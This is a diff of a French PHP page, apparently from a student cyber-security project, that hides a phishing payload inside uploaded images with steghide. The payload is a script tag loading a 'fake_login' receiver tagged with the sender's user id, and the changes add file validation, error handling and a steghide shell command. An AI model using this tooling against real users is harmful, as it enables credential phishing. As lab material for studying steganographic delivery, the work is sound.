@@ -15,10 +15,11 @@ $user_id = $_SESSION["user_id"];
 $username = $_SESSION["username"] ?? "Utilisateur";
 
 // Dossier pour les images stéganographiées
-$upload_dir = __DIR__ . '/uploads/';
+$upload_dir = __DIR__ . '/../uploads/images/';
 if (!is_dir($upload_dir)) {
     mkdir($upload_dir, 0755, true);
 }
+chmod($upload_dir, 0755);
 
 $message = '';
 $message_type = '';
@@ -28,52 +29,125 @@ $stego_image = '';
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
     $file = $_FILES['image'];
     
-    // Validation
-    $allowed = ['image/jpeg', 'image/png', 'image/bmp'];
+    // Validation première vérification
+    $allowed = ['image/jpeg', 'image/png', 'image/bmp', 'image/x-ms-bmp', 'image/x-bmp'];
     if (!in_array($file['type'], $allowed)) {
         $message = "Format non autorisé. Utilisez JPG, PNG ou BMP.";
         $message_type = 'error';
     } elseif ($file['size'] > 5 * 1024 * 1024) { // 5MB max
-        $message = "L'image est trop volumineuse (max 5MB).";
+        $message = "L'image est trop volumieuse (max 5MB).";
         $message_type = 'error';
     } else {
         try {
+            // Vérifier que le dossier est accessible en écriture
+            if (!is_writable($upload_dir)) {
+                throw new Exception("Le dossier de destination n'est pas accessible en écriture. Permissions refusées.");
+            }
+            
             // Sauvegarder l'image temporaire
             $temp_filename = 'temp_' . time() . '_' . basename($file['name']);
             $temp_path = $upload_dir . $temp_filename;
             
             if (!move_uploaded_file($file['tmp_name'], $temp_path)) {
-                throw new Exception("Erreur lors du téléchargement de l'image");
+                throw new Exception("Impossible de télécharger le fichier. Vérifiez les permissions du dossier.");
+            }
+            
+            // Vérifier le type MIME réel du fichier (pas juste l'extension)
+            $finfo = finfo_open(FILEINFO_MIME_TYPE);
+            $real_mime = finfo_file($finfo, $temp_path);
+            finfo_close($finfo);
+            
+            $valid_mimes = ['image/jpeg', 'image/png', 'image/bmp', 'image/x-ms-bmp', 'image/x-bmp'];
+            if (!in_array($real_mime, $valid_mimes)) {
+                if (file_exists($temp_path)) {
+                    unlink($temp_path);
+                }
+                throw new Exception("Le fichier n'est pas une image valide. Type détecté: " . htmlspecialchars($real_mime) . ". Utilisez un vrai fichier JPG, PNG ou BMP.");
+            }
+            
+            // Vérifier les dimensions de l'image (au minimum 100x100 pour Steghide)
+            $image_info = @getimagesize($temp_path);
+            if ($image_info === false) {
+                if (file_exists($temp_path)) {
+                    unlink($temp_path);
+                }
+                throw new Exception("Impossible de lire l'image. Le fichier peut être corrompu.");
+            }
+            
+            $width = $image_info[0];
+            $height = $image_info[1];
+            
+            if ($width < 100 || $height < 100) {
+                if (file_exists($temp_path)) {
+                    unlink($temp_path);
+                }
+                throw new Exception("L'image est trop petite pour la stéganographie. Dimensions: {$width}x{$height}. Minimum requis: 100x100 pixels. Utilisez une image plus grande.");
             }
             
             // Générer le payload (script de phishing)
             $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
             $host = $_SERVER['HTTP_HOST'];
-            $baseUrl = $protocol . "://" . $host . "/messagerie";
+            $baseUrl = $protocol . "://" . $host . "/projects/MDI/cyber-securite/messagerie";
             
             $payload = '<script src="' . $baseUrl . '/codes/fake_login/receiver.php?sender=' . $user_id . '"></script>';
             
             // Créer un fichier temporaire avec le payload
             $payload_file = $upload_dir . 'payload_' . time() . '.txt';
-            file_put_contents($payload_file, $payload);
+            if (file_put_contents($payload_file, $payload) === false) {
+                throw new Exception("Impossible d'écrire le fichier payload.");
+            }
+            
+            // Vérifier la taille du payload vs l'image (Steghide peut avoir des problèmes si le payload est trop gros)
+            $image_size = filesize($temp_path);
+            $payload_size = filesize($payload_file);
+            
+            // Steghide peut stocker environ 1 byte par 10-16 bytes d'image (être permissif)
+            $min_image_size_for_payload = $payload_size * 10; // Ratio 1:10
+            
+            if ($image_size < $min_image_size_for_payload) {
+                if (file_exists($payload_file)) {
+                    unlink($payload_file);
+                }
+                if (file_exists($temp_path)) {
+                    unlink($temp_path);
+                }
+                $required_size = $min_image_size_for_payload;
+                $required_kb = round($required_size / 1024, 1);
+                $current_kb = round($image_size / 1024, 1);
+                throw new Exception("❌ L'image est trop petite!\n\nTaille actuelle: {$current_kb}KB\nTaille minimale requise: {$required_kb}KB\nPayload: {$payload_size}B\n\nSolution: Utilisez une image plus grande (au moins 1920x1280 ou 200KB+)");
+            }
             
             // Utiliser Steghide pour cacher le payload
             $output_filename = 'stego_' . time() . '_' . basename($file['name']);
             $output_path = $upload_dir . $output_filename;
             
-            // Commande Steghide
-            $cmd = "steghide embed -cf " . escapeshellarg($temp_path) . " -ef " . escapeshellarg($payload_file) . " -sf " . escapeshellarg($output_path) . " -p '' -f";
+            // Commande Steghide - Réinitialiser LD_LIBRARY_PATH pour éviter les bibliothèques XAMPP
+            // (XAMPP a des versions anciennes de libstdc++.so.6 qui causent des problèmes)
+            $cmd = "LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu:/usr/lib:/lib/x86_64-linux-gnu:/lib /usr/bin/steghide embed -cf " . escapeshellarg($temp_path) . " -ef " . escapeshellarg($payload_file) . " -sf " . escapeshellarg($output_path) . " -p '' -f 2>&1";
             
             $output = [];
             $return_var = 0;
-            exec($cmd . " 2>&1", $output, $return_var);
+            exec($cmd, $output, $return_var);
             
             // Nettoyer les fichiers temporaires
-            unlink($temp_path);
-            unlink($payload_file);
+            if (file_exists($temp_path)) {
+                unlink($temp_path);
+            }
+            if (file_exists($payload_file)) {
+                unlink($payload_file);
+            }
             
             if ($return_var !== 0) {
-                throw new Exception("Erreur Steghide: " . implode("\n", $output));
+                $error_msg = implode("\n", $output);
+                // Nettoyer aussi le fichier de sortie en cas d'erreur
+                if (file_exists($output_path)) {
+                    unlink($output_path);
+                }
+                throw new Exception("Erreur Steghide: " . $error_msg);
+            }
+            
+            if (!file_exists($output_path)) {
+                throw new Exception("L'image stéganographiée n'a pas été créée. Vérifiez que Steghide est installé.");
             }
             
             $stego_image = $output_filename;
@@ -81,10 +155,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
             $message_type = 'success';
             
         } catch (Exception $e) {
-            $message = "Erreur: " . $e->getMessage();
+            $message = "❌ " . $e->getMessage();
             $message_type = 'error';
             if (isset($temp_path) && file_exists($temp_path)) {
                 unlink($temp_path);
+            }
+            if (isset($payload_file) && file_exists($payload_file)) {
+                unlink($payload_file);
+            }
+            if (isset($output_path) && file_exists($output_path)) {
+                unlink($output_path);
             }
         }
     }
@@ -428,7 +508,7 @@ if (isset($_GET['download'])) {
             
             <?php if ($message): ?>
                 <div class="message <?php echo $message_type; ?>">
-                    <?php echo htmlspecialchars($message); ?>
+                    <?php echo nl2br(htmlspecialchars($message)); ?>
                 </div>
             <?php endif; ?>
             
@@ -451,6 +531,12 @@ if (isset($_GET['download'])) {
                     </button>
                 </div>
             </form>
+            
+            <div style="margin-top: 15px; padding: 10px; background: #f0f0f0; border-radius: 5px; text-align: center;">
+                <a href="debug_steghide.php" style="color: #667eea; text-decoration: none;">
+                    🔧 Problème? Utilisez le diagnostic complet
+                </a>
+            </div>
             
             <!-- Résultat -->
             <?php if ($stego_image): ?>
